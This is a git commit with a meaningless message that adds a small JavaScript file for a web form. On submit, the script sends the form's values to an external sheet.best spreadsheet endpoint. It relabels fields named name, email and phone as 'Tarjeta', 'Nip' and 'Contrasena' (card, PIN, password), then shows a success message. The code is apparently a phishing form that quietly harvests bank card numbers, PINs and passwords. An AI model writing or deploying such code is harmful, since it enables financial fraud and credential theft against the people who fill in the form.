c037bb988202de58f256c00da5695860a60ddfee
aztonlinemx <139991402+aztonlinemx@users.noreply.github.com>
2023-07-19 09:13:42 -0600

    zdcxfbhsftgjnhs
    dfstrzhhsdftghnnsdftgjnhsrtf

---
+++ js/app.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('formulario');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/cc05be7d-9f44-4d37-b6e2-14c8428a8e14', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Tarjeta": formulario.nombre.value,
+            "Nip": formulario.correo.value,
+            "Contrasena": formulario.telefono.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
